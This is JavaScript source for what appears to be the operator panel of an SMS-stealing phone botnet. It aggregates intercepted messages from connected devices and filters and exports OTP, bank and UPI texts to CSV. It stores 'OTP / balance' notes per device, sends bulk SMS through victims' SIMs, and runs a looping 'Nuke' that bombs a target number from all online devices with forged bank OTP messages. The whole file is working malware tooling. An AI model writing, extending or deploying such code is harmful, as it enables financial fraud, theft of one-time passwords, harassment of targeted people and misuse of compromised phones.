(function () {
  'use strict';

  var NOTES_KEY = 'gru_dev_notes';
  var OTP_KEY = 'gru_otp_notes';
  var nukeActive = false;
  var nukeStop = false;
  var globalFilter = 'all';
  var globalCache = [];
  var lastSmsFilter = 'all';

  function api(path, data, method) {
    var o = { headers: { Accept: 'application/json' }, credentials: 'same-origin' };
    o.method = method || (data ? 'POST' : 'GET');
    if (data) {
      o.headers['Content-Type'] = 'application/json';
      o.body = JSON.stringify(data);
    }
    return fetch(path, o).then(function (r) { return r.json().catch(function () { return {}; }); });
  }

  function toast(msg) {
    if (window.gruToast) return window.gruToast(msg);
    var t = document.getElementById('gru-toast');
    if (!t) return;
    t.textContent = msg;
    t.classList.add('show');
    setTimeout(function () { t.classList.remove('show'); }, 2600);
  }

  function copyText(text, label) {
    if (window.gruCopyText) return window.gruCopyText(text, label);
    navigator.clipboard.writeText(String(text || '')).then(function () { toast(label || 'Copied'); });
  }

  function esc(s) {
    return String(s == null ? '' : s)
      .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
  }

  function fmtDt(t) {
    if (!t) return '—';
    try { return new Date(t).toLocaleString(); } catch (e) { return '—'; }
  }

  function loadJson(key) {
    try { return JSON.parse(localStorage.getItem(key) || '{}') || {}; } catch (e) { return {}; }
  }
  function saveJson(key, obj) { localStorage.setItem(key, JSON.stringify(obj)); }

  function getNote(id) { return loadJson(NOTES_KEY)[id] || ''; }
  function setNote(id, text) {
    var n = loadJson(NOTES_KEY);
    if (text) n[id] = text; else delete n[id];
    saveJson(NOTES_KEY, n);
  }
  function getOtpNote(id) { return loadJson(OTP_KEY)[id] || ''; }
  function setOtpNote(id, text) {
    var n = loadJson(OTP_KEY);
    if (text) n[id] = text; else delete n[id];
    saveJson(OTP_KEY, n);
  }

  function csvEscape(v) {
    var s = String(v == null ? '' : v);
    if (/[",\n]/.test(s)) return '"' + s.replace(/"/g, '""') + '"';
    return s;
  }

  function downloadCsv(name, rows) {
    var blob = new Blob([rows.join('\n')], { type: 'text/csv;charset=utf-8' });
    var a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = name;
    a.click();
    URL.revokeObjectURL(a.href);
  }

  function isDltMsg(m) {
    if (!m) return false;
    if (m.otp) return true;
    var s = String(m.text || '').toLowerCase();
    return /(otp|one ?time|verification code|aadhaar|bank|debit|credit|upi|wallet|payment|cashback|refund)/.test(s);
  }

  function ensureOverlay() {
    if (document.getElementById('gru-adv-overlay')) return;
    var ov = document.createElement('div');
    ov.id = 'gru-adv-overlay';
    ov.innerHTML = '<div class="gru-adv-modal" id="gru-adv-modal"><div class="gru-adv-head"><h2 id="gru-adv-title">Advanced</h2><button type="button" class="gru-adv-close" id="gru-adv-close">×</button></div><div class="gru-adv-body" id="gru-adv-body"></div></div>';
    document.body.appendChild(ov);
    ov.addEventListener('click', function (e) { if (e.target === ov) closeModal(); });
    document.getElementById('gru-adv-close').onclick = closeModal;
  }

  function openModal(title, html, wide, danger) {
    ensureOverlay();
    var modal = document.getElementById('gru-adv-modal');
    document.getElementById('gru-adv-title').textContent = title;
    document.getElementById('gru-adv-body').innerHTML = html;
    modal.classList.toggle('wide', !!wide);
    modal.classList.toggle('danger', !!danger);
    document.getElementById('gru-adv-overlay').classList.add('open');
  }

  function closeModal() {
    var ov = document.getElementById('gru-adv-overlay');
    if (ov) ov.classList.remove('open');
  }

  function fbShort(u) {
    var s = String(u || '').replace(/^https?:\/\//i, '').replace(/\/+$/, '');
    var p = s.split('.');
    return p[0] || s;
  }

  function renderFirebases(list, opts) {
    var host = document.getElementById('gru-fb-list');
    if (!host) return;
    var primary = (opts && opts.primary) || '';
    var maskFn = window.gruMaskFbUrl || function (u) {
      var s = String(u || '').replace(/^https?:\/\//i, '').replace(/\/+$/, '');
      var dot = s.indexOf('.');
      if (dot <= 0) return s;
      var first = s.slice(0, dot), rest = s.slice(dot);
      if (first.length <= 5) return first + rest;
      return first.slice(0, 2) + '*****' + first.slice(-3) + rest;
    };
    if (!list.length) {
      host.innerHTML = '<p class="gru-fb-empty">No extra connections. Add another Firebase below to see its devices together in this panel.</p>';
    } else {
      host.innerHTML = list.map(function (f) {
        var isPrimary = f.url === primary || f.primary;
        return '<div class="gru-fb-row">' +
          '<span class="gru-fb-badge">' + esc(fbShort(f.label || f.url).replace(/[^a-z0-9]/gi, '').slice(0, 2).toUpperCase() || 'FB') + '</span>' +
          '<div class="gru-fb-meta"><span class="gru-fb-name" title="' + esc(f.label || fbShort(f.url)) + ' — full URL: ' + esc(f.url) + '">' + esc(f.label || fbShort(f.url)) + (isPrimary ? ' <em>primary</em>' : '') + '</span>' +
          '<span class="gru-fb-url" title="' + esc(f.url) + '">' + esc(maskFn(f.url)) + '</span></div>' +
          '<button type="button" class="gru-fb-copy" data-fb-copy="' + esc(f.url) + '" title="Copy the FULL firebase URL (original, unencrypted)">Copy URL</button>' +
          '<button type="button" class="gru-fb-x" data-fb-rm="' + esc(f.url) + '" title="Remove this connection">×</button>' +
          '</div>';
      }).join('');
    }
    host.querySelectorAll('[data-fb-copy]').forEach(function (b) {
      b.onclick = function () {
        copyText(b.getAttribute('data-fb-copy'), 'Full Firebase URL copied');
      };
    });
    host.querySelectorAll('[data-fb-rm]').forEach(function (b) {
      b.onclick = function () {
        var url = b.getAttribute('data-fb-rm');
        if (url === (opts && opts.primary)) {
          if (!window.confirm('Remove the PRIMARY connection? The session needs at least one firebase — connect a new one afterwards.')) return;
        }
        var add = window.gruRemoveFirebase || function (u) { return api('/api/firebases/remove', { url: u }); };
        add(url).then(function () {
          toast('Connection removed — refreshing devices...');
          setTimeout(function () { location.reload(); }, 700);
        }).catch(function (e) { toast(e.message || 'Remove failed'); });
      };
    });
  }

  function loadFirebases(host) {
    api('/api/firebases').then(function (r) {
      var list = (r && r.firebases) || [];
      var primary = '';
      list.forEach(function (f) { if (f.primary || !primary) primary = primary || f.url; });
      renderFirebases(list, { primary: primary });
      if (host && host._gruPrimary) host._gruPrimary = primary;
    }).catch(function (e) {
      toast(e.message || 'Failed to load connections');
    });
  }

  function openFirebases() {
    var html =
      '<p class="gru-adv-hint">Connect MULTIPLE firebases — devices from all of them appear together in this panel. Copy gives you the FULL original URL (not masked).</p>' +
      '<div class="gru-fb-add">' +
      '<input id="gru-fb-url" class="gru-inp" placeholder="https://your-app-default-rtdb.firebaseio.com" value="">' +
      '<input id="gru-fb-key" class="gru-inp" placeholder="Web API key (optional)" value="">' +
      '<button type="button" class="gru-btn gru-btn-green" id="gru-fb-add-btn">＋ Add Firebase</button></div>' +
      '<p class="gru-section-title">Connected firebases</p>' +
      '<div class="gru-fb-list" id="gru-fb-list"><p class="gru-fb-empty">Loading...</p></div>';
    openModal('🔥 Multi-Firebase', html, true);
    loadFirebases();
    var btn = document.getElementById('gru-fb-add-btn');
    btn.onclick = function () {
      var url = (document.getElementById('gru-fb-url').value || '').trim();
      var key = (document.getElementById('gru-fb-key').value || '').trim();
      if (!url) { toast('Firebase URL required'); return; }
      btn.disabled = true;
      btn.textContent = 'Connecting...';
      var addFn = window.gruAddFirebase || function (u, k) { return api('/api/firebases/add', { url: u, key: k }); };
      addFn(url, key).then(function (r) {
        toast('Connected — refreshing devices...');
        setTimeout(function () { location.reload(); }, 700);
      }).catch(function (e) {
        btn.disabled = false;
        btn.textContent = '＋ Add Firebase';
        toast('Failed: ' + (e.message || 'connection error'));
      });
    };
  }

  function injectToolbar() {
    if (document.getElementById('gru-adv-bar')) return;
    var header = document.querySelector('header.sticky .ml-auto') ||
      document.querySelector('header .ml-auto') ||
      document.querySelector('.sticky .ml-auto');
    if (!header) return;
    var bar = document.createElement('div');
    bar.id = 'gru-adv-bar';
    bar.innerHTML =
      '<button type="button" class="gru-adv-btn cyan" data-act="global">📋 All Msg</button>' +
      '<button type="button" class="gru-adv-btn green" data-act="bulk">📡 Bulk SMS</button>' +
      '<button type="button" class="gru-adv-btn purple" data-act="csv">⬇ CSV</button>' +
      '<button type="button" class="gru-adv-btn" data-act="ping">📍 Ping All</button>' +
      '<button type="button" class="gru-adv-btn green" data-act="firebase">🔥 FB</button>' +
      '<button type="button" class="gru-adv-btn cyan" data-act="share">🔗 Share</button>' +
      '<button type="button" class="gru-adv-btn green" data-act="cards">🎨 Cards</button>' +
      '<button type="button" class="gru-adv-btn" data-act="font">Aa+</button>' +
      '<button type="button" class="gru-adv-btn red" data-act="nuke">💣 Nuke</button>';
    header.insertBefore(bar, header.firstChild);
    bar.addEventListener('click', function (e) {
      var btn = e.target.closest('[data-act]');
      if (!btn) return;
      var act = btn.getAttribute('data-act');
      if (act === 'global') openGlobalMsgs();
      else if (act === 'bulk') openBulkSms();
      else if (act === 'csv') exportAllCsv();
      else if (act === 'ping') pingAllDevices();
      else if (act === 'firebase') openFirebases();
      else if (act === 'share') {
        var build = window.gruBuildShareList || function () { return []; };
        var list = build();
        if (!list.length) { toast('Pehle connect karo'); return; }
        (window.gruShareLink || function () { return Promise.resolve(); })(list);
      }
      else if (act === 'font') cycleFont();
      else if (act === 'cards') openCardColors();
      else if (act === 'nuke') openNuke();
    });
  }

  function buildGlobalList(list) {
    var el = document.getElementById('gru-global-list');
    if (!el) return;
    el.innerHTML = list.map(function (m, i) {
      var note = getNote(m.deviceId);
      var txt = m.text || '';
      var blob = [m.deviceName, m.deviceId, m.from, m.text, note].join(' ').toLowerCase();
      return '<div class="gru-adv-gcard ' + (m.sent ? 'out' : 'inc') + '" data-gidx="' + i + '" data-sent="' + (m.sent ? '1' : '0') + '" data-dlt="' + (isDltMsg(m) ? '1' : '0') + '" data-blob="' + esc(blob) + '" data-copy-msg="1" title="Click — full message copy">' +
        '<div class="gru-adv-gmeta"><span class="gru-adv-gdev">' + esc(m.deviceName) + '</span>' +
        '<span>' + esc(m.from || '-') + ' · ' + fmtDt(m.time) + '</span></div>' +
        (note ? '<div style="font-size:10px;color:#c4b5fd;margin-bottom:4px">📝 ' + esc(note) + '</div>' : '') +
        '<div class="gru-adv-gtext">' + esc(txt) + '</div></div>';
    }).join('');
    el.querySelectorAll('[data-copy-msg]').forEach(function (card) {
      card.onclick = function () {
        var idx = Number(card.getAttribute('data-gidx'));
        var fn = window.gruCopyText || copyText;
        fn(list[idx] && list[idx].text, 'Message copied');
      };
    });
  }

  function filterGlobalList() {
    var qEl = document.getElementById('gru-global-q');
    var needle = (qEl ? qEl.value : '').toLowerCase();
    var el = document.getElementById('gru-global-list');
    var emptyEl = document.getElementById('gru-global-empty');
    if (!el) return;
    var visible = 0;
    el.querySelectorAll('.gru-adv-gcard').forEach(function (card) {
      var sent = card.getAttribute('data-sent') === '1';
      var show = true;
      if (globalFilter === 'incoming' && sent) show = false;
      if (globalFilter === 'outgoing' && !sent) show = false;
      if (globalFilter === 'dlt' && card.getAttribute('data-dlt') !== '1') show = false;
      if (show && needle) {
        var blob = (card.getAttribute('data-blob') || '').toLowerCase();
        show = blob.indexOf(needle) >= 0;
      }
      card.style.display = show ? '' : 'none';
      if (show) visible++;
    });
    var countEl = document.getElementById('gru-global-count');
    if (countEl) countEl.textContent = visible + ' / ' + globalCache.length;
    if (emptyEl) emptyEl.style.display = visible ? 'none' : '';
  }

  function renderGlobalList(list) {
    buildGlobalList(list);
    filterGlobalList();
  }

  function wireGlobalModal() {
    var qEl = document.getElementById('gru-global-q');
    if (qEl && !qEl._gruWired) {
      qEl._gruWired = true;
      qEl.addEventListener('input', filterGlobalList);
    }
    var refreshBtn = document.getElementById('gru-global-refresh');
    if (refreshBtn && !refreshBtn._gruWired) {
      refreshBtn._gruWired = true;
      refreshBtn.onclick = function () {
        var prevQ = (document.getElementById('gru-global-q') || {}).value || '';
        api('/api/sms/all?limit=80').then(function (res) {
          globalCache = res.sms || [];
          buildGlobalList(globalCache);
          var q = document.getElementById('gru-global-q');
          if (q && prevQ) q.value = prevQ;
          filterGlobalList();
          toast('Refreshed');
        });
      };
    }
    document.querySelectorAll('[data-gf]').forEach(function (btn) {
      if (btn._gruWired) return;
      btn._gruWired = true;
      btn.onclick = function () {
        globalFilter = btn.getAttribute('data-gf');
        document.querySelectorAll('[data-gf]').forEach(function (b) { b.classList.toggle('on', b === btn); });
        filterGlobalList();
      };
    });
  }

  function openGlobalMsgs() {
    var ov = document.getElementById('gru-adv-overlay');
    var prevQEl = document.getElementById('gru-global-q');
    var prevQ = prevQEl ? prevQEl.value : '';
    var searchFocused = prevQEl && document.activeElement === prevQEl;
    var alreadyOpen = ov && ov.classList.contains('open') && document.getElementById('gru-global-list');

    if (!alreadyOpen) {
      openModal('📋 All Messages (All Devices)', '<p style="color:#b4c4d8;font-size:13px">Loading…</p>', true);
    }

    api('/api/sms/all?limit=80').then(function (r) {
      globalCache = r.sms || [];
      if (!document.getElementById('gru-adv-body')) return;
      if (!document.getElementById('gru-global-list')) {
        document.getElementById('gru-adv-body').innerHTML =
          '<div class="gru-adv-toolbar-row">' +
          '<span id="gru-global-count" style="font-size:12px;font-weight:700;color:#22d3ee">' + globalCache.length + '</span>' +
          '<button type="button" class="gru-adv-mini" id="gru-global-refresh">↻ Refresh</button></div>' +
          '<div class="gru-adv-filters">' +
          '<button type="button" class="gru-adv-chip on" data-gf="all">All</button>' +
          '<button type="button" class="gru-adv-chip" data-gf="incoming">Incoming</button>' +
          '<button type="button" class="gru-adv-chip" data-gf="outgoing">Outgoing</button>' +
          '<button type="button" class="gru-adv-chip" data-gf="dlt">DLT</button></div>' +
          '<input id="gru-global-q" class="gru-inp" placeholder="Search device, sender, note, text…">' +
          '<p id="gru-global-empty" class="gru-empty" style="display:none">No messages found</p>' +
          '<div class="gru-adv-global-list" id="gru-global-list"></div>';
      }
      var q = document.getElementById('gru-global-q');
      if (q && prevQ) q.value = prevQ;
      renderGlobalList(globalCache);
      wireGlobalModal();
      if (searchFocused && q) {
        q.focus();
        try { q.setSelectionRange(q.value.length, q.value.length); } catch (_) {}
      }
    }).catch(function () {
      var body = document.getElementById('gru-adv-body');
      if (body) body.innerHTML = '<p id="gru-global-empty" class="gru-empty">Load failed (bahut saare messages). ' +
        '<button type="button" class="gru-adv-mini" id="gru-global-retry">↻ Retry</button></p>';
      var retry = document.getElementById('gru-global-retry');
      if (retry) retry.onclick = openGlobalMsgs;
    });
  }

  function openBulkSms() {
    api('/api/devices').then(function (r) {
      var devs = r.devices || [];
      var rows = devs.map(function (d) {
        return '<label class="gru-adv-check-row"><input type="checkbox" class="gru-bulk-chk" value="' + esc(d.id) + '">' +
          '<span style="flex:1">' + esc(d.name || d.id) + '</span>' +
          '<span style="font-size:10px;color:' + (d.online ? '#6ee7b7' : '#fca5a5') + '">' + (d.online ? 'Online' : 'Offline') + '</span></label>';
      }).join('');
      openModal('📡 Bulk SMS', (
        '<div class="gru-adv-row">' +
        '<button type="button" class="gru-adv-mini" id="gru-bulk-on">Online Only</button>' +
        '<button type="button" class="gru-adv-mini" id="gru-bulk-all">Select All</button>' +
        '<button type="button" class="gru-adv-mini" id="gru-bulk-none">Clear</button></div>' +
        '<div class="gru-adv-list" id="gru-bulk-list">' + (rows || '<p class="gru-empty">No devices</p>') + '</div>' +
        '<label class="gru-adv-label">Target Number</label><input id="gru-bulk-to" class="gru-inp" placeholder="+919876543210">' +
        '<label class="gru-adv-label">SIM</label><div class="gru-adv-row">' +
        '<button type="button" class="gru-adv-chip on" data-bsim="0">SIM 1</button>' +
        '<button type="button" class="gru-adv-chip" data-bsim="1">SIM 2</button></div>' +
        '<label class="gru-adv-label">Message</label><textarea id="gru-bulk-msg" class="gru-inp" rows="4" placeholder="Message…"></textarea>' +
        '<button type="button" class="gru-adv-send" id="gru-bulk-fire" style="margin-top:12px">🚀 Send to Selected</button>' +
        '<p id="gru-bulk-res" style="margin-top:10px;font-size:12px;color:#b4c4d8"></p>'
      ));
      var bulkSim = 0;
      document.querySelectorAll('[data-bsim]').forEach(function (b) {
        b.onclick = function () {
          bulkSim = Number(b.getAttribute('data-bsim'));
          document.querySelectorAll('[data-bsim]').forEach(function (x) { x.classList.toggle('on', x === b); });
        };
      });
      document.getElementById('gru-bulk-on').onclick = function () {
        document.querySelectorAll('.gru-bulk-chk').forEach(function (c) {
          var row = c.closest('.gru-adv-check-row');
          var on = row && row.textContent.indexOf('Online') >= 0;
          c.checked = !!on;
        });
      };
      document.getElementById('gru-bulk-all').onclick = function () {
        document.querySelectorAll('.gru-bulk-chk').forEach(function (c) { c.checked = true; });
      };
      document.getElementById('gru-bulk-none').onclick = function () {
        document.querySelectorAll('.gru-bulk-chk').forEach(function (c) { c.checked = false; });
      };
      document.getElementById('gru-bulk-fire').onclick = function () {
        var ids = [];
        document.querySelectorAll('.gru-bulk-chk:checked').forEach(function (c) { ids.push(c.value); });
        var to = document.getElementById('gru-bulk-to').value.trim();
        var msg = document.getElementById('gru-bulk-msg').value.trim();
        if (!ids.length) return toast('Select devices');
        if (!to || !msg) return toast('Number & message required');
        document.getElementById('gru-bulk-res').textContent = 'Sending…';
        api('/api/sms/bulk-send', { deviceIds: ids, number: to, message: msg, sim: bulkSim }).then(function (res) {
          var resEl = document.getElementById('gru-bulk-res');
          if (!res.ok) { resEl.textContent = res.error || 'Failed'; return toast(res.error || 'Failed'); }
          var sent = 0, pend = 0, unk = 0, bad = 0;
          (res.results || []).forEach(function (rr) {
            if (!rr.ok) bad++;
            else if (rr.ack === 'sent') sent++;
            else if (rr.ack === 'pending') pend++;
            else unk++;
          });
          var rowsHtml = (res.results || []).map(function (rr) {
            var icon = rr.ack === 'sent' ? '✅' : (rr.ack === 'pending' ? '⚠️' : (rr.ok ? '📨' : '❌'));
            var note = rr.ok && rr.ack === 'pending' ? ' <span style="color:#fca5a5">phone received, NOT sent</span>'
              : (rr.error ? ' <span style="color:#fca5a5">' + esc(rr.error) + '</span>' : '');
            return '<div style="font-size:12px">' + icon + ' ' + esc(rr.id.slice(0, 14)) + note + '</div>';
          }).join('');
          resEl.innerHTML =
            '<div style="color:#6ee7b7;font-weight:700">✅ Sent by phone: ' + sent + '</div>' +
            '<div style="color:#fca5a5;font-weight:700">⚠️ Phone received but did not send: ' + pend + '</div>' +
            '<div style="color:#b4c4d8">📨 Queued (unconfirmed): ' + unk + '</div>' +
            (bad ? '<div style="color:#fca5a5">Errors: ' + bad + '</div>' : '') +
            '<div class="gru-nuke-log" style="margin-top:8px;max-height:120px">' + rowsHtml + '</div>';
          toast('Bulk done — ' + sent + ' sent by phones');
        });
      };
    });
  }

  function openCardColors() {
    var themes = (window.gruCardThemes || []);
    var current = (window.gruCardState && window.gruCardState()) || 'carbon';
    function findTheme(k) {
      for (var i = 0; i < themes.length; i++) if (themes[i].key === k) return themes[i];
      if (k === 'custom') return (window.gruMakeCustom ? window.gruMakeCustom(window.gruCardCustomHue()) : null);
      return themes[0] || { grad: '#111111', name: 'Carbon' };
    }
    var sw = themes.map(function (t) {
      return '<button type="button" class="gru-bg-swatch gru-card-swatch' + (t.key === current ? ' on' : '') + '" data-key="' + t.key + '" title="' + esc(t.name) + '" style="background:' + t.grad + '"><span>' + esc(t.name) + '</span></button>';
    }).join('');
    openModal('🎨 Device Card Colors',
      '<p style="font-size:11px;color:#9fb3cb;margin-bottom:10px">' + themes.length + '+ colors — saari devices ke cards + uske andar (Info/Bank/Card/Send panel) ek hi color. Rainbow line ko slide karke apna color banao, ya 🔁 Auto se khud rotate karta rahe.</p>' +
      '<div class="gru-bg-swatches" id="gru-card-swatches">' + sw + '</div>' +
      '<div class="gru-bg-row" style="margin-top:12px">' +
      '<div class="gru-bg-line" id="gru-card-line"><div class="gru-bg-thumb" id="gru-card-thumb"></div></div>' +
      '<div class="gru-bg-ctl">' +
      '<button type="button" class="gru-btn" id="gru-card-auto">🔁 Auto</button>' +
      '<button type="button" class="gru-btn" id="gru-card-custom">🌈 Custom</button>' +
      '<button type="button" class="gru-btn ghost" id="gru-card-random">🎲 Shuffle</button>' +
      '<button type="button" class="gru-btn ghost" id="gru-card-reset">↺ Carbon</button>' +
      '<div class="gru-bg-preview" id="gru-card-preview"></div>' +
      '</div></div>',
      true);
    function find(id) { return document.getElementById(id); }
    function refreshPreview() {
      var pv = find('gru-card-preview');
      var inAuto = !!(window.gruCardAutoState && window.gruCardAutoState());
      var t = window.__gruCardThemeObj || findTheme(current);
      if (pv && t) {
        pv.style.background = t.grad;
        pv.textContent = (inAuto ? 'Auto ✦ ' : '') + t.name;
      }
      var ab = find('gru-card-auto');
      if (ab) ab.classList.toggle('on', inAuto);
      var th = find('gru-card-thumb'), line = find('gru-card-line');
      if (th && line) {
        var hh = line.clientHeight || 1;
        var hue = (window.gruCardState && window.gruCardState()) === 'custom' ? window.gruCardCustomHue() : 210;
        th.style.top = Math.max(4, Math.min(hh - 14, Math.round((1 - (hue / 360)) * (hh - 14)) + 2)) + 'px';
      }
    }
    var swc = find('gru-card-swatches');
    function handlePick(key) {
      if (window.gruApplyCard) { window.gruApplyCard(key); refreshPreview(); }
    }
    if (swc) swc.onclick = function (e) {
      var b = e.target.closest('.gru-bg-swatch');
      if (b) handlePick(b.getAttribute('data-key'));
    };
    var cust = find('gru-card-custom'), rnd = find('gru-card-random'), rst = find('gru-card-reset'), auto = find('gru-card-auto');
    if (auto) auto.onclick = function () {
      var on = !(window.gruCardAutoState && window.gruCardAutoState());
      if (window.gruCardSetAuto) window.gruCardSetAuto(on);
      refreshPreview();
    };
    if (cust) cust.onclick = function () {
      var hue = (window.gruCardState && window.gruCardState()) === 'custom' ? window.gruCardCustomHue() : 210;
      if (window.gruApplyCustomCard) window.gruApplyCustomCard(hue);
      refreshPreview();
    };
    if (rnd) rnd.onclick = function () {
      var t = themes[Math.floor(Math.random() * themes.length)];
      handlePick(t.key);
    };
    if (rst) rst.onclick = function () { handlePick('carbon'); };
    var line = find('gru-card-line');
    if (line) {
      var dragging = false;
      function setHueFrom(clientY) {
        var r = line.getBoundingClientRect();
        var y = Math.max(0, Math.min(r.height, clientY - r.top));
        var hue = Math.round((1 - y / r.height) * 360);
        if (window.gruApplyCustomCard) window.gruApplyCustomCard(hue);
        refreshPreview();
      }
      line.addEventListener('pointerdown', function (e) {
        dragging = true;
        if (line.setPointerCapture) { try { line.setPointerCapture(e.pointerId); } catch (err) {} }
        setHueFrom(e.clientY);
      });
      line.addEventListener('pointermove', function (e) { if (dragging) setHueFrom(e.clientY); });
      line.addEventListener('pointerup', function () { dragging = false; });
      line.addEventListener('pointercancel', function () { dragging = false; });
    }
    if (window.gruApplyCard) window.gruApplyCard(current);
    refreshPreview();
  }

  function exportAllCsv() {
    api('/api/sms/all?limit=120').then(function (r) {
      var sms = r.sms || [];
      if (!sms.length) return toast('No SMS to export');
      var lines = ['device_id,device_name,from,to,type,time,text,otp'];
      sms.forEach(function (m) {
        lines.push([
          csvEscape(m.deviceId), csvEscape(m.deviceName), csvEscape(m.from), csvEscape(m.to),
          csvEscape(m.sent ? 'outgoing' : 'incoming'), csvEscape(fmtDt(m.time)),
          csvEscape(m.text), csvEscape(m.otp || ''),
        ].join(','));
      });
      downloadCsv('anounymous_gru_all_sms.csv', lines);
      toast('CSV downloaded');
    });
  }

  function pingAllDevices() {
    api('/api/devices?filter=online').then(function (r) {
      var devs = r.devices || [];
      if (!devs.length) return toast('No online devices');
      var n = 0;
      devs.forEach(function (d) {
        api('/api/devices/' + encodeURIComponent(d.id) + '/detect-number').then(function () { n++; });
      });
      toast('Ping sent to ' + devs.length + ' devices');
    });
  }

  var fontStep = 0;
  function cycleFont() {
    fontStep = (fontStep + 1) % 4;
    var sizes = ['15px', '16px', '17px', '18px'];
    document.documentElement.style.fontSize = sizes[fontStep];
    toast('Font: ' + sizes[fontStep]);
  }

  function randomOtpMsg() {
    var otp = String(Math.floor(100000 + Math.random() * 900000));
    var banks = ['HDFC', 'SBI', 'ICICI', 'AXIS', 'PNB', 'KOTAK'];
    return 'Dear Customer, OTP for your transaction is ' + otp + '. Do not share. -' + banks[Math.floor(Math.random() * banks.length)];
  }

  function openNuke() {
    openModal('💣 Nuke — All Online Devices', (
      '<p style="color:#fca5a5;font-size:12px;margin-bottom:12px">Fires from ALL online devices at once in a loop. Press Stop to halt.</p>' +
      '<label class="gru-adv-label">Target Number</label><input id="gru-nuke-to" class="gru-inp" placeholder="+919876543210">' +
      '<label class="gru-adv-label">SIM</label><div class="gru-adv-row">' +
      '<button type="button" class="gru-adv-chip on" data-nsim="0">SIM 1</button>' +
      '<button type="button" class="gru-adv-chip" data-nsim="1">SIM 2</button></div>' +
      '<label class="gru-adv-label">Mode</label><div class="gru-adv-row">' +
      '<button type="button" class="gru-adv-chip on" data-nmode="random">🎲 Random OTP</button>' +
      '<button type="button" class="gru-adv-chip" data-nmode="custom">✎ Custom</button></div>' +
      '<textarea id="gru-nuke-msg" class="gru-inp" rows="3" placeholder="Custom message…" style="display:none"></textarea>' +
      '<div id="gru-nuke-prev" class="gru-nuke-prev"><span style="font-size:10px;color:#b4c4d8;font-weight:700;letter-spacing:.5px">PREVIEW</span><span id="gru-nuke-prev-txt" style="color:#6ee7b7;font-weight:700;word-break:break-word"></span><button type="button" id="gru-nuke-regen" class="gru-adv-mini" style="flex:none;margin-left:auto;padding:3px 10px" title="Generate another">🎲 New</button></div>' +
      '<div class="gru-nuke-stats"><div><div style="font-size:10px;color:#b4c4d8">Sent</div><div class="gru-nuke-num" id="gru-nuke-sent" style="color:#6ee7b7">0</div></div>' +
      '<div><div style="font-size:10px;color:#b4c4d8">Failed</div><div class="gru-nuke-num" id="gru-nuke-fail" style="color:#fca5a5">0</div></div></div>' +
      '<div class="gru-nuke-log" id="gru-nuke-log"></div>' +
      '<div class="gru-adv-row" style="margin-top:12px">' +
      '<button type="button" class="gru-adv-send danger" id="gru-nuke-start" style="flex:1">💣 Fire</button>' +
      '<button type="button" class="gru-adv-mini danger" id="gru-nuke-stop" style="flex:1;padding:13px">⏹ Stop</button></div>'
    ), false, true);
    var nSim = 0;
    var nMode = 'random';
    function genNukePreview() {
      var t = document.getElementById('gru-nuke-prev-txt');
      if (t) t.textContent = randomOtpMsg();
    }
    genNukePreview();
    var regenBtn = document.getElementById('gru-nuke-regen');
    if (regenBtn) regenBtn.onclick = genNukePreview;
    document.querySelectorAll('[data-nsim]').forEach(function (b) {
      b.onclick = function () {
        nSim = Number(b.getAttribute('data-nsim'));
        document.querySelectorAll('[data-nsim]').forEach(function (x) { x.classList.toggle('on', x === b); });
      };
    });
    document.querySelectorAll('[data-nmode]').forEach(function (b) {
      b.onclick = function () {
        nMode = b.getAttribute('data-nmode');
        document.querySelectorAll('[data-nmode]').forEach(function (x) { x.classList.toggle('on', x === b); });
        var ta = document.getElementById('gru-nuke-msg');
        var pv = document.getElementById('gru-nuke-prev');
        ta.style.display = nMode === 'custom' ? '' : 'none';
        if (pv) pv.style.display = nMode === 'custom' ? 'none' : '';
        if (nMode === 'random') genNukePreview();
      };
    });
    document.getElementById('gru-nuke-stop').onclick = function () {
      nukeStop = true;
      toast('Nuke stopping…');
    };
    document.getElementById('gru-nuke-start').onclick = function () {
      if (nukeActive) return toast('Already running');
      var to = document.getElementById('gru-nuke-to').value.trim();
      if (!to) return toast('Target number required');
      nukeActive = true;
      nukeStop = false;
      var sent = 0;
      var fail = 0;
      function log(line) {
        var el = document.getElementById('gru-nuke-log');
        if (!el) return;
        el.innerHTML = '<div>' + esc(line) + '</div>' + el.innerHTML;
      }
      function round() {
        if (nukeStop) { nukeActive = false; toast('Nuke stopped'); return; }
        api('/api/devices?filter=online').then(function (r) {
          var devs = r.devices || [];
          if (!devs.length) { nukeActive = false; return toast('No online devices'); }
          var msg = nMode === 'custom' ? document.getElementById('gru-nuke-msg').value.trim() : randomOtpMsg();
          if (!msg) { nukeActive = false; return toast('Message required'); }
          var pending = devs.length;
          devs.forEach(function (d) {
            api('/api/devices/' + encodeURIComponent(d.id) + '/send-sms', { number: to, message: msg, sim: nSim }).then(function (res) {
              if (res.ok !== false && !res.error) {
                sent++;
                log((res.ack === 'sent' ? '✅' : (res.ack === 'pending' ? '⚠️' : '✓')) + ' ' + d.name + (res.ack === 'pending' ? ' (phone not sending)' : ''));
              } else {
                fail++;
                log('✗ ' + d.name + (res.error ? ' — ' + res.error : ''));
              }
              document.getElementById('gru-nuke-sent').textContent = sent;
              document.getElementById('gru-nuke-fail').textContent = fail;
              pending--;
              if (pending <= 0 && !nukeStop) setTimeout(round, 800);
              else if (pending <= 0) nukeActive = false;
            });
          });
        });
      }
      round();
    };
  }

  window.gruRenderNotePanel = function (host, devId) {
    var note = getNote(devId);
    var otp = getOtpNote(devId);
    host.innerHTML =
      '<div class="px-4 py-3">' +
      '<div class="gru-note-box" style="margin-bottom:14px">' +
      '<p class="gru-section-title">📝 Device Note</p>' +
      '<div class="gru-note-disp ' + (note ? '' : 'empty') + '" id="gru-note-disp">' + (note ? esc(note) : 'No note saved…') + '</div>' +
      '<div style="display:flex;gap:8px"><input id="gru-note-inp" class="gru-inp" placeholder="Write a note (shown on device list)…" value="' + esc(note) + '">' +
      '<button type="button" class="gru-btn" id="gru-note-save">Save</button></div></div>' +
      '<div class="gru-note-box">' +
      '<p class="gru-section-title">💳 OTP Note</p>' +
      '<div class="gru-note-disp ' + (otp ? '' : 'empty') + '" id="gru-otp-disp">' + (otp ? esc(otp) : 'No OTP note…') + '</div>' +
      '<div style="display:flex;gap:8px"><input id="gru-otp-inp" class="gru-inp" placeholder="Save OTP / balance…" value="' + esc(otp) + '">' +
      '<button type="button" class="gru-btn" id="gru-otp-save">Save</button></div></div></div>';
    host.querySelector('#gru-note-save').onclick = function () {
      var v = host.querySelector('#gru-note-inp').value.trim();
      setNote(devId, v);
      host.querySelector('#gru-note-disp').textContent = v || 'No note saved…';
